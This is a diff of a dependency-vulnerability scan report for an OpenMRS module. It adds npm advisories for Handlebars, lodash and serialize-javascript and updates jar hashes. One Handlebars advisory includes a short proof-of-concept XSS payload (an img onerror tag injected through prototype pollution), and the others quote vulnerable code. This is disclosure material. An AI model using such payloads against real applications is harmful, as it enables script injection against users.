+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-9cx6-37pm-9jff","name": "https:\/\/github.com\/advisories\/GHSA-9cx6-37pm-9jff"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<\\=4.7.8:*:*:*:*:*:*:*"
                         }
                     }                ]
                 }, {
@@ -3550,6 +3792,48 @@
                     }                ]
                 }, {
                 "source": "NPM",
+                "name": "GHSA-2qvq-rjwj-gvw9",
+"unscored": "true", "severity" : "moderate",
+                    "cvssv3": {
+                        "baseScore": 4.699999809265137
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "REQUIRED"
+                        ,"scope": "CHANGED"
+                        ,"confidentialityImpact": "LOW"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "NONE"
+                        ,"baseSeverity": "MEDIUM"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-79",                        "CWE-1321"                    ],
+                "description": "## Summary\n\n`resolvePartial()` in the Handlebars runtime resolves partial names via a plain property lookup on `options.partials` without guarding against prototype-chain traversal. When `Object.prototype` has been polluted with a string value whose key matches a partial reference in a template, the polluted string is used as the partial body and rendered **without HTML escaping**, resulting in reflected or stored XSS.\n\n## Description\n\nThe root cause is in `lib\/handlebars\/runtime.js` inside `resolvePartial()` and `invokePartial()`:\n\n```javascript\n\/\/ Vulnerable: plain bracket access traverses Object.prototype\npartial = options.partials[options.name];\n```\n\n`hasOwnProperty` is never checked, so if `Object.prototype` has been seeded with a key whose name matches a partial reference in the template (e.g. `widget`), the lookup succeeds and the polluted string is returned. The runtime emits a prototype-access warning, but the partial is still resolved and its content is inserted into the rendered output unescaped. This contradicts the documented security model and is distinct from CVE-2021-23369 and CVE-2021-23383, which addressed data property access rather than partial template resolution.\n\n**Prerequisites for exploitation:**\n1. The target application must be vulnerable to prototype pollution (e.g. via `qs`, `minimist`, or\n   any querystring\/JSON merge sink).\n2. The attacker must know or guess the name of a partial reference used in a template.\n\n## Proof of Concept\n\n```javascript\nconst Handlebars = require('handlebars');\n\n\/\/ Step 1: Prototype pollution (via qs, minimist, or another vector)\nObject.prototype.widget = '<img src=x onerror=\"alert(document.domain)\">';\n\n\/\/ Step 2: Normal template that references a partial\nconst template = Handlebars.compile('<div>Welcome! {{> widget}}<\/div>');\n\n\/\/ Step 3: Render \u2014 XSS payload injected unescaped\nconst output = template({});\n\/\/ Output: <div>Welcome! <img src=x onerror=\"alert(document.domain)\"><\/div>\n```\n\n> The runtime prints a prototype access warning claiming \"access has been denied,\" but the partial still resolves and returns the polluted value.\n\n## Workarounds\n\n- Apply `Object.freeze(Object.prototype)` early in application startup to prevent prototype  pollution. Note: this may break other libraries.\n- Use the Handlebars runtime-only build (`handlebars\/runtime`), which does not compile templates  and reduces the attack surface.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-2qvq-rjwj-gvw9","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-2qvq-rjwj-gvw9"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-23369","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-23369"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-23383","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2021-23383"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-2qvq-rjwj-gvw9","name": "https:\/\/github.com\/advisories\/GHSA-2qvq-rjwj-gvw9"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33916","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33916"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<4.7.9:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
                 "name": "GHSA-f52g-6jhx-586p",
 "unscored": "true", "severity" : "moderate",
                     "cwes": [
@@ -3566,6 +3850,42 @@
  {
                         "software": { 
                             "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<4.4.5:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
+                "name": "GHSA-442j-39wm-28r2",
+"unscored": "true", "severity" : "low",
+                    "cvssv3": {
+                        "baseScore": 3.700000047683716
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "LOW"
+                        ,"integrityImpact": "NONE"
+                        ,"availabilityImpact": "NONE"
+                        ,"baseSeverity": "LOW"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-367"                    ],
+                "description": "## Summary\n\nIn `lib\/handlebars\/runtime.js`, the `container.lookup()` function uses `container.lookupProperty()` as a gate check to enforce prototype-access controls, but then discards the validated result and performs a second, unguarded property access (`depths[i][name]`). This Time-of-Check Time-of-Use (TOCTOU) pattern means the security check and the actual read are decoupled, and the raw access bypasses any sanitization that `lookupProperty` may perform.\n\nOnly relevant when the **compat** compile option is enabled (`{compat: true}`), which activates `depthedLookup` in `lib\/handlebars\/compiler\/javascript-compiler.js`.\n\n## Description\n\nThe vulnerable code in `lib\/handlebars\/runtime.js` (lines 137\u2013144):\n\n```javascript\nlookup: function (depths, name) {\n  const len = depths.length;\n  for (let i = 0; i < len; i++) {\n    let result = depths[i] && container.lookupProperty(depths[i], name);\n    if (result != null) {\n      return depths[i][name];  \/\/ BUG: should be `return result;`\n    }\n  }\n},\n```\n\n`container.lookupProperty()` (lines 119\u2013136) enforces `hasOwnProperty` checks and `resultIsAllowed()` prototype-access controls. However, `container.lookup()` only uses `lookupProperty` as a boolean gate \u2014 if the gate passes (`result != null`), it then performs an independent, raw `depths[i][name]` access that circumvents any transformation or wrapped value that `lookupProperty` may have returned.\n\n## Workarounds\n\n- Avoid enabling `{ compat: true }` when rendering templates that include untrusted data.\n- Ensure context data objects are plain JSON (no Proxies, no getter-based accessor properties).",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/commit\/68d8df5a88e0a26fe9e6084c5c6aaebe67b07da2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-442j-39wm-28r2","name": "https:\/\/github.com\/advisories\/GHSA-442j-39wm-28r2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-442j-39wm-28r2","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/security\/advisories\/GHSA-442j-39wm-28r2"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9","name": "https:\/\/github.com\/handlebars-lang\/handlebars.js\/releases\/tag\/v4.7.9"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:handlebars:\\>\\=4.0.0\\<\\=4.7.8:*:*:*:*:*:*:*"
                         }
                     }                ]
                 }            ]        },{
@@ -5112,6 +5432,46 @@
                     }                ]
                 }, {
                 "source": "NPM",
+                "name": "GHSA-r5fr-rjxr-66jc",
+"unscored": "true", "severity" : "high",
+                    "cvssv3": {
+                        "baseScore": 8.100000381469727
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "HIGH"
+                        ,"integrityImpact": "HIGH"
+                        ,"availabilityImpact": "HIGH"
+                        ,"baseSeverity": "HIGH"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-94"                    ],
+                "description": "### Impact\n\nThe fix for [CVE-2021-23337](https:\/\/github.com\/advisories\/GHSA-35jh-r3h4-6jhm) added validation for the `variable` option in `_.template` but did not apply the same validation to `options.imports` key names. Both paths flow into the same `Function()` constructor sink.\n\nWhen an application passes untrusted input as `options.imports` key names, an attacker can inject default-parameter expressions that execute arbitrary code at template compilation time.\n\nAdditionally, `_.template` uses `assignInWith` to merge imports, which enumerates inherited properties via `for..in`. If `Object.prototype` has been polluted by any other vector, the polluted keys are copied into the imports object and passed to `Function()`.\n\n### Patches\n\nUsers should upgrade to version 4.18.0.\n\nThe fix applies two changes:\n1. Validate `importsKeys` against the existing `reForbiddenIdentifierChars` regex (same check already used for the `variable` option)\n2. Replace `assignInWith` with `assignWith` when merging imports, so only own properties are enumerated\n\n### Workarounds\n\nDo not pass untrusted input as key names in `options.imports`. Only use developer-controlled, static key names.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-4800","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-4800"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/cna.openjsf.org\/security-advisories.html","name": "https:\/\/cna.openjsf.org\/security-advisories.html"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-35jh-r3h4-6jhm","name": "https:\/\/github.com\/advisories\/GHSA-35jh-r3h4-6jhm"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-r5fr-rjxr-66jc","name": "https:\/\/github.com\/advisories\/GHSA-r5fr-rjxr-66jc"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-r5fr-rjxr-66jc","name": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-r5fr-rjxr-66jc"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/lodash\/lodash\/commit\/3469357cff396a26c363f8c1b5a91dde28ba4b1c","name": "https:\/\/github.com\/lodash\/lodash\/commit\/3469357cff396a26c363f8c1b5a91dde28ba4b1c"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:lodash:\\>\\=4.0.0\\<\\=4.17.23:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
                 "name": "GHSA-p6mc-m468-83gw",
 "unscored": "true", "severity" : "high",
                     "cvssv3": {
@@ -5250,6 +5610,42 @@
  {
                         "software": { 
                             "id":"cpe:2.3:a:*:lodash:\\<4.17.11:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
+                "name": "GHSA-f23m-r3pf-42rh",
+"unscored": "true", "severity" : "moderate",
+                    "cvssv3": {
+                        "baseScore": 6.5
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "LOW"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "NONE"
+                        ,"integrityImpact": "LOW"
+                        ,"availabilityImpact": "LOW"
+                        ,"baseSeverity": "MEDIUM"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-1321"                    ],
+                "description": "### Impact\n\nLodash versions 4.17.23 and earlier are vulnerable to prototype pollution in the `_.unset` and `_.omit` functions. The fix for [CVE-2025-13465](https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-xxjr-mmjv-4gpg) only guards against string key members, so an attacker can bypass the check by passing array-wrapped path segments. This allows deletion of properties from built-in prototypes such as `Object.prototype`, `Number.prototype`, and `String.prototype`.\n\nThe issue permits deletion of prototype properties but does not allow overwriting their original behavior.\n\n### Patches\n\nThis issue is patched in 4.18.0.\n\n### Workarounds\n\nNone. Upgrade to the patched version.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-f23m-r3pf-42rh","name": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-f23m-r3pf-42rh"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-2950","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-2950"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-f23m-r3pf-42rh","name": "https:\/\/github.com\/advisories\/GHSA-f23m-r3pf-42rh"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-xxjr-mmjv-4gpg","name": "https:\/\/github.com\/lodash\/lodash\/security\/advisories\/GHSA-xxjr-mmjv-4gpg"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:lodash:\\<\\=4.17.23:*:*:*:*:*:*:*"
                         }
                     }                ]
                 }, {
@@ -6853,9 +7249,9 @@
             "isVirtual": false,
             "fileName": "patientflags-3.0.11-SNAPSHOT.jar",
             "filePath": "\/github\/workspace\/omod\/target\/patientflags-3.0.11-SNAPSHOT.jar"
-,"md5": "4909ada136e53c1cdc46da4e6b2cd64d",
-            "sha1": "f498dea7dbba4245704b76052698d925ba51d999",
-            "sha256": "e95848f7dcc2b4ef4d91fa90a3a97f288630e0e9e846da912a567c8f2fd4123d"            ,"evidenceCollected": {
+,"md5": "400f7035bc468409b01cc1aea02a8c01",
+            "sha1": "6546b85564680e31e8a65832ebe6df29cdf10670",
+            "sha256": "9edebde7db14b1272be6c1ea1eb563502824a055a18235c57e1f691be82e123d"            ,"evidenceCollected": {
                 "vendorEvidence": [
 {
                             "type": "vendor",
@@ -6959,24 +7355,24 @@
             "isVirtual": false,
             "fileName": "patientflags-api-3.0.11-SNAPSHOT.jar",
             "filePath": "\/github\/workspace\/api\/target\/patientflags-api-3.0.11-SNAPSHOT.jar"
-,"md5": "a3cabce9730686c89b10f84666d01c2b",
-            "sha1": "fb65ee5401717d2292609d0d217c0425afc68796",
-            "sha256": "4e5724b67875aee7554db48b2b7c054c60c6fd8c3676cfd246d2001c35f2e80c","description": "API project for Patient Flags Module"            ,"relatedDependencies": [
+,"md5": "77129d708dd4dc132000b3f3eb3b3759",
+            "sha1": "ed6b2a2231e40bb08a032add313c10f85026427d",
+            "sha256": "8b77547cb8207cf4d5fc545f1ca6ffbcc22fd12b6528f8aea553de2e05b5c3b0","description": "API project for Patient Flags Module"            ,"relatedDependencies": [
   {
                     "isVirtual": false,
                     "fileName": "patientflags-api-3.0.11-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/omod\/target\/patientflags-3.0.11-SNAPSHOT\/lib\/patientflags-api-3.0.11-SNAPSHOT.jar"
-,"sha256": "4e5724b67875aee7554db48b2b7c054c60c6fd8c3676cfd246d2001c35f2e80c",
-                    "sha1": "fb65ee5401717d2292609d0d217c0425afc68796",
-                    "md5": "a3cabce9730686c89b10f84666d01c2b"
+,"sha256": "8b77547cb8207cf4d5fc545f1ca6ffbcc22fd12b6528f8aea553de2e05b5c3b0",
+                    "sha1": "ed6b2a2231e40bb08a032add313c10f85026427d",
+                    "md5": "77129d708dd4dc132000b3f3eb3b3759"
                 }
  , {
                     "isVirtual": false,
                     "fileName": "patientflags-api-metadata-3.0.11-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/api-metadata\/target\/patientflags-api-metadata-3.0.11-SNAPSHOT.jar"
-,"sha256": "020a5117b0f033cf3194d5302281096a1615b219c4cb15bec41a5740a0b64b7a",
-                    "sha1": "2113eaebeb20185bd219920bf7d95370bb5fa49b",
-                    "md5": "9c71ee44ff1366ad0694b30c296d8e50",
+,"sha256": "ad54f485eaa5be234bc8336b92bcda31bb07490561a53c43440d1d752fe8b638",
+                    "sha1": "92dce853ee288c5df93ef343a1f3ba116167cad1",
+                    "md5": "c1f9e7d6f6fb5f32643d07f939962cba",
                     "packageIds": [
                             {
                                 "id": "pkg:maven/org.openmrs.module/patientflags-api-metadata@3.0.11-SNAPSHOT"
@@ -6987,17 +7383,17 @@
                     "isVirtual": false,
                     "fileName": "patientflags-api-metadata-3.0.11-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/omod\/target\/patientflags-3.0.11-SNAPSHOT\/lib\/patientflags-api-metadata-3.0.11-SNAPSHOT.jar"
-,"sha256": "020a5117b0f033cf3194d5302281096a1615b219c4cb15bec41a5740a0b64b7a",
-                    "sha1": "2113eaebeb20185bd219920bf7d95370bb5fa49b",
-                    "md5": "9c71ee44ff1366ad0694b30c296d8e50"
+,"sha256": "ad54f485eaa5be234bc8336b92bcda31bb07490561a53c43440d1d752fe8b638",
+                    "sha1": "92dce853ee288c5df93ef343a1f3ba116167cad1",
+                    "md5": "c1f9e7d6f6fb5f32643d07f939962cba"
                 }
  , {
                     "isVirtual": false,
                     "fileName": "patientflags-fhir-3.0.11-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/fhir\/target\/patientflags-fhir-3.0.11-SNAPSHOT.jar"
-,"sha256": "86141d65adbdab8bb050c66e7362e6c55b6b88fe92ddddbea7f34f35e8e17eaf",
-                    "sha1": "d2315e91a5586770c16eae0a97fff482eac81d7f",
-                    "md5": "ec1b2377e7e1b75bd455e04a941cc911",
+,"sha256": "7b3f3b9f07509a5bfa691142b040c70d8490c56c26dce946e694ca0b904b5244",
+                    "sha1": "70bd71bdd8ab38be17b39f01a50ad2723ac660f9",
+                    "md5": "14957d0664fe8547609cc30353e91b5b",
                     "packageIds": [
                             {
                                 "id": "pkg:maven/org.openmrs.module/patientflags-fhir@3.0.11-SNAPSHOT"
@@ -7008,9 +7404,9 @@
                     "isVirtual": false,
                     "fileName": "patientflags-fhir-3.0.11-SNAPSHOT.jar",
                     "filePath": "\/github\/workspace\/omod\/target\/patientflags-3.0.11-SNAPSHOT\/lib\/patientflags-fhir-3.0.11-SNAPSHOT.jar"
-,"sha256": "86141d65adbdab8bb050c66e7362e6c55b6b88fe92ddddbea7f34f35e8e17eaf",
-                    "sha1": "d2315e91a5586770c16eae0a97fff482eac81d7f",
-                    "md5": "ec1b2377e7e1b75bd455e04a941cc911"
+,"sha256": "7b3f3b9f07509a5bfa691142b040c70d8490c56c26dce946e694ca0b904b5244",
+                    "sha1": "70bd71bdd8ab38be17b39f01a50ad2723ac660f9",
+                    "md5": "14957d0664fe8547609cc30353e91b5b"
                 }
             ]
             ,"evidenceCollected": {
@@ -8320,6 +8716,44 @@
                     }                ]
                 }, {
                 "source": "NPM",
+                "name": "GHSA-qj8w-gfj5-8c6v",
+"unscored": "true", "severity" : "moderate",
+                    "cvssv3": {
+                        "baseScore": 5.900000095367432
+                        ,"attackVector": "NETWORK"
+                        ,"attackComplexity": "HIGH"
+                        ,"privilegesRequired": "NONE"
+                        ,"userInteraction": "NONE"
+                        ,"scope": "UNCHANGED"
+                        ,"confidentialityImpact": "NONE"
+                        ,"integrityImpact": "NONE"
+                        ,"availabilityImpact": "HIGH"
+                        ,"baseSeverity": "MEDIUM"
+,"version": "3.1"                    },
+                    "cwes": [
+                        "CWE-400",                        "CWE-834"                    ],
+                "description": "### Impact\n\n**What kind of vulnerability is it?**\n\nIt is a **Denial of Service (DoS)** vulnerability caused by CPU exhaustion. When serializing a specially crafted \"array-like\" object (an object that inherits from `Array.prototype` but has a very large `length` property), the process enters an intensive loop that consumes 100% CPU and hangs indefinitely.\n\n**Who is impacted?**\n\nApplications that use `serialize-javascript` to serialize untrusted or user-controlled objects are at risk. While direct exploitation is difficult, it becomes a high-priority threat if the application is also vulnerable to **Prototype Pollution** or handles untrusted data via **YAML Deserialization**, as these could be used to inject the malicious object.\n\n### Patches\n\n**Has the problem been patched?**\n\nYes, the issue has been patched by replacing `instanceof Array` checks with `Array.isArray()` and using `Object.keys()` for sparse array detection.\n\n**What versions should users upgrade to?**\n\nUsers should upgrade to **`v7.0.5`** or later.\n\n### Workarounds\n\n**Is there a way for users to fix or remediate the vulnerability without upgrading?**\n\nThere is no direct code-level workaround within the library itself. However, users can mitigate the risk by:\n\n* Validating and sanitizing all input before passing it to the `serialize()` function.\n* Ensuring the environment is protected against Prototype Pollution.\n* Upgrading to **`v7.0.5`** as soon as possible.\n\n### Acknowledgements\n\nSerialize JavaScript thanks **Tomer Aberbach** (@TomerAberbach) for discovering and privately disclosing this issue.",
+                "notes": "",
+                "references": [
+ {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/yahoo\/serialize-javascript\/releases\/tag\/v7.0.5","name": "https:\/\/github.com\/yahoo\/serialize-javascript\/releases\/tag\/v7.0.5"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/yahoo\/serialize-javascript\/security\/advisories\/GHSA-qj8w-gfj5-8c6v","name": "https:\/\/github.com\/yahoo\/serialize-javascript\/security\/advisories\/GHSA-qj8w-gfj5-8c6v"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/advisories\/GHSA-qj8w-gfj5-8c6v","name": "https:\/\/github.com\/advisories\/GHSA-qj8w-gfj5-8c6v"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-34043","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-34043"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/github.com\/yahoo\/serialize-javascript\/commit\/f147e90269b58bb6e539cfdf3d0e20d6ad14204b","name": "https:\/\/github.com\/yahoo\/serialize-javascript\/commit\/f147e90269b58bb6e539cfdf3d0e20d6ad14204b"                    }                ],
+                "vulnerableSoftware": [
+ {
+                        "software": { 
+                            "id":"cpe:2.3:a:*:serialize-javascript:\\<7.0.5:*:*:*:*:*:*:*"
+                        }
+                    }                ]
+                }, {
+                "source": "NPM",
                 "name": "GHSA-h9rv-jmmf-4pgx",
 "unscored": "true", "severity" : "moderate",
                     "cvssv3": {
@@ -8708,6 +9142,8 @@
  {
                         "source": "NPM Advisory reference: "
 ,"url": "https:\/\/github.com\/socketio\/socket.io\/commit\/9d39f1f080510f036782f2177fac701cc041faaf","name": "https:\/\/github.com\/socketio\/socket.io\/commit\/9d39f1f080510f036782f2177fac701cc041faaf"                    }, {
+                        "source": "NPM Advisory reference: "
+,"url": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33151","name": "https:\/\/nvd.nist.gov\/vuln\/detail\/CVE-2026-33151"                    }, {
                         "source": "NPM Advisory reference: "
 ,"url": "https:\/\/github.com\/socketio\/socket.io\/commit\/719f9ebab0772ffb882bd614b387e585c1aa75d4","name": "https:\/\/github.com\/socketio\/socket.io\/commit\/719f9ebab0772ffb882bd614b387e585c1aa75d4"                    }, {
                         "source": "NPM Advisory reference: "
